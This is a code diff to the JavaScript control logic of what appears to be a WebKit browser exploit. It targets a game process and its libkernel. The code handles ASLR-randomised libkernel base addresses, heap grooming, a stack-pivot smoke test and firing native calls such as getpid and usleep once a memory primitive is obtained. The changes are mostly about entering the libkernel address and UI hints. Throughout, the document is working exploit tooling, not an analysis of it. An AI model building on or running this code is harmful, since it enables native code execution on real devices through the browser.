@@ -61,7 +61,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250832r";
+const BUILD_ID = "rw-20250830t";
 const SS_NATIVE_MODE = "wk-native-mode";
 /** Auto-fire at PRIMITIVE-OK — #native-mode dropdown. Default off (fire kills tab if lk/pivot wrong). */
 function getNativeMode() {
@@ -81,6 +81,34 @@ function setNativeMode(mode) {
 function nativeFireOff() { return getNativeMode() === "off"; }
 /** BillZaiD fixed lk base (game process) — trial in WebKit via usleep prologue */
 const BILLZAI_LK_BASE = "80a67c000";
+
+/** lk rotates with ASLR each browser load — drop stale session on reload. */
+function clearStaleLkOnReload() {
+    try {
+        const nav = performance.getEntriesByType("navigation")[0];
+        if (nav && nav.type === "reload") {
+            sessionStorage.removeItem("wk-libkernelBase");
+            sessionStorage.removeItem("wk-libkernelForced");
+            return true;
+        }
+    } catch (_) { }
+    return false;
+}
+
+/** Live hex box wins over session (session may be stale after reload). */
+function lkFromUi() {
+    if (addrIn && addrIn.value) {
+        const live = parseAddr(String(addrIn.value).trim().replace(/^0x/i, ""));
+        if (live) return live;
+    }
+    const forced = loadForcedLibkernel();
+    if (forced) return forced;
+    try {
+        const raw = sessionStorage.getItem("wk-libkernelBase");
+        if (raw) return parseAddr(String(raw).replace(/^0x/i, ""));
+    } catch (_) { }
+    return null;
+}
 const SS_HUNT_TRACE = "wk-hunt-trace";
 const SS_HUNT_STATE = "wk-hunt-state";
 /** opt-in only — release triggers JSC GC */
@@ -393,7 +421,9 @@ function basesFromSession(off) {
             webkitBase = derived;
         }
     }
-    let libkernelBase = parseAddr(sessionStorage.getItem("wk-libkernelBase"));
+    let libkernelBase = lkFromUi();
+    if (!libkernelBase)
+        libkernelBase = parseAddr(sessionStorage.getItem("wk-libkernelBase"));
     return { nativeFn, webkitBase, libkernelBase };
 }
 
@@ -2325,8 +2355,8 @@ function acceptLkFromHex(hexOverride) {
     if (asBase.ok) {
         saveLibkernelSession(ptr, null, { forced: true });
         if (addrIn) addrIn.value = String(ptr);
-        mark("LK-OK", String(ptr) + " lk base accepted (0 reads) — reload → Start");
-        state("lk saved — reload then Start", "ok");
+        mark("LK-OK", String(ptr) + " lk base accepted (0 reads) — Start → peek or Arm getpid");
+        state("lk accepted — Start (no reload)", "ok");
         renderOut();
         try {
             crashLog.append("ACCEPT OK okage " + hex, "LK-VERIFY");
@@ -2341,8 +2371,8 @@ function acceptLkFromHex(hexOverride) {
         saveLibkernelSession(h.lk, null, { forced: true });
         if (addrIn) addrIn.value = String(h.lk);
         mark("LK-OK", String(h.lk) + " = fn−" + h.key
-            + "+0x" + h.rva.toString(16) + " (0 reads) — reload → Start");
-        state("lk saved — reload then Start", "ok");
+            + "+0x" + h.rva.toString(16) + " (0 reads) — Start → peek or Arm getpid");
+        state("lk accepted — Start (no reload)", "ok");
         renderOut();
         try {
             crashLog.append("ACCEPT OK fn " + hex + " → " + h.lk, "LK-VERIFY");
@@ -3330,12 +3360,6 @@ function resolveWebkitBase(off, nativeFn) {
     return null;
 }
 
-function lkFromUi() {
-    return loadForcedLibkernel()
-        || (addrIn && addrIn.value
-            ? parseAddr(String(addrIn.value).replace(/^0x/i, "")) : null);
-}
-
 /** Capture expm1 + slab once at PRIMITIVE-OK — before any other taps eat heap. */
 function ensureNativePrep(p, off) {
     if (nativePrep) return nativePrep;
@@ -3386,20 +3410,11 @@ function tryNativeFireAtStart(p, off) {
             state("pivot smoke OK — chain works", "ok");
             return;
         }
-        const lk = loadForcedLibkernel()
-            || (() => {
-                try {
-                    const raw = sessionStorage.getItem("wk-libkernelBase");
-                    if (raw) return parseAddr(String(raw).replace(/^0x/i, ""));
-                } catch (_) { }
-                return null;
-            })()
-            || (addrIn && addrIn.value ? parseAddr(addrIn.value.replace(/^0x/i, "")) : null);
+        const lk = lkFromUi();
         if (!lk) {
-            mark("NATIVE-SKIP", "Accept lk → reload → Start");
+            mark("NATIVE-SKIP", "paste lk in hex box → Accept lk → Start");
             return;
         }
-        if (addrIn) addrIn.value = String(lk);
         if (nm === "getpid") {
             mark("NATIVE-FIRE", "getpid @ PRIMITIVE-OK lk=" + lk);
             renderOut();
@@ -3490,7 +3505,7 @@ function runFireGetpid() {
     const nm = getNativeMode();
     const lk = lkFromUi();
     if (nm !== "smoke" && !lk) {
-        mark("NATIVE-SKIP", "Accept lk first");
+        mark("NATIVE-SKIP", "paste lk → Accept lk (optional) → Arm getpid");
         renderOut();
         return;
     }
@@ -3782,12 +3797,12 @@ async function runStart() {
             mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
         }
         renderOut();
-        mark("HINT", "Start → 1-read lk (WebKit) → reload → native usleep → Start");
+        mark("HINT", "paste lk from cal → Accept lk → Start → peek / Arm getpid (stay on page, no reload)");
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
         ready = true;
         ensureUiVisible();
-        state("primitive OK — 1-read lk for WebKit base", "ok");
+        state("primitive OK — paste lk, Accept, peek or native", "ok");
     } catch (err) {
         state("failed: " + err.message, "bad");
         mark("ERROR", err.stack || err.message);
@@ -3926,15 +3941,9 @@ function init() {
         if (addrIn) addrIn.value = lkParam.replace(/^0x/i, "");
         acceptLkFromHex(lkParam.replace(/^0x/i, ""));
     } else {
-        try {
-            const saved = loadForcedLibkernel();
-            if (saved && addrIn) addrIn.value = String(saved);
-            else {
-                const raw = sessionStorage.getItem("wk-libkernelBase");
-                const parsed = raw ? parseAddr(String(raw).replace(/^0x/i, "")) : null;
-                if (parsed && addrIn) addrIn.value = String(parsed);
-            }
-        } catch (_) { }
+        if (clearStaleLkOnReload())
+            mark("LK-FRESH", "cleared stale lk — ASLR rotates each reload");
+        mark("LK-HINT", "paste lk from cal (e.g. 81e9dc000) → Accept lk → Start");
     }
 
     if (params.get("clearlog") === "1") clearPersistedLog();
@@ -3954,7 +3963,7 @@ function init() {
     wireGroomBar(() => busy);
     setUi();
     renderOut();
-    state("Start → Scan ext→lk or cal 2e for WebKit libkernel", "");
+    state("Start → paste lk from cal, Accept lk, peek (no reload)", "");
 }
 
 function bootUi() {
